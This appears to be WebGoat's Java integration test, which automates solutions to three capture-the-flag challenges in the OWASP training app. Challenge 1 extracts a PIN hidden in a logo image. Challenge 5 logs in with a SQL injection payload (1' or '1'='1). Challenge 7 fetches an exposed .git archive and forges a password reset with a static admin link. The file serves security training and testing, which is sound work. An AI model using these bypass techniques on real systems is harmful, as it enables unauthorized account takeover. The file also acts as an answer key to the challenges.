/*
 * SPDX-FileCopyrightText: Copyright © 2022 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration;

import io.restassured.RestAssured;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import org.assertj.core.api.Assertions;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

public class ChallengeIntegrationTest extends IntegrationTest {

  @Test
  void testChallenge1() {
    startLesson("Challenge1");

    byte[] resultBytes =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(webGoatUrlConfig.url("challenge/logo"))
            .then()
            .statusCode(200)
            .extract()
            .asByteArray();

    String pincode = new String(Arrays.copyOfRange(resultBytes, 81216, 81220));
    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("username", "admin");
    params.put("password", "!!webgoat_admin_1234!!".replace("1234", pincode));

    checkAssignment(webGoatUrlConfig.url("challenge/1"), params, true);
    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParams(params)
            .post(webGoatUrlConfig.url("challenge/1"))
            .then()
            .statusCode(200)
            .extract()
            .asString();

    String flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42);
    params.clear();
    params.put("flag", flag);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/1"), params, true);

    checkResults("Challenge1");
  }

  @Test
  void testChallenge5() {
    startLesson("Challenge5");

    Map<String, Object> params = new HashMap<>();
    params.clear();
    params.put("username_login", "Larry");
    params.put("password_login", "1' or '1'='1");

    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParams(params)
            .post(webGoatUrlConfig.url("challenge/5"))
            .then()
            .statusCode(200)
            .extract()
            .asString();

    String flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42);
    params.clear();
    params.put("flag", flag);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/5"), params, true);

    checkResults("Challenge5");
  }

  @Test
  void testChallenge7() {
    startLesson("Challenge7");
    cleanMailbox();

    // One should first be able to download git.zip from WebGoat
    RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("JSESSIONID", getWebGoatCookie())
        .get(webGoatUrlConfig.url("challenge/7/.git"))
        .then()
        .statusCode(200)
        .extract()
        .asString();

    // Should email WebWolf inbox this should give a hint to the link being static
    RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("JSESSIONID", getWebGoatCookie())
        .formParams("email", getUser() + "@webgoat.org")
        .post(webGoatUrlConfig.url("challenge/7"))
        .then()
        .statusCode(200)
        .extract()
        .asString();

    // Check whether email has been received
    var responseBody =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("WEBWOLFSESSION", getWebWolfCookie())
            .get(webWolfUrlConfig.url("mail"))
            .then()
            .extract()
            .response()
            .getBody()
            .asString();
    Assertions.assertThat(responseBody).contains("Hi, you requested a password reset link");

    // Call reset link with admin link
    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(
                webGoatUrlConfig.url("challenge/7/reset-password/{link}"),
                "375afe1104f4a487a73823c50a9292a2")
            .then()
            .statusCode(HttpStatus.ACCEPTED.value())
            .extract()
            .asString();

    String flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42);
    checkAssignment(webGoatUrlConfig.url("challenge/flag/7"), Map.of("flag", flag), true);
  }
}
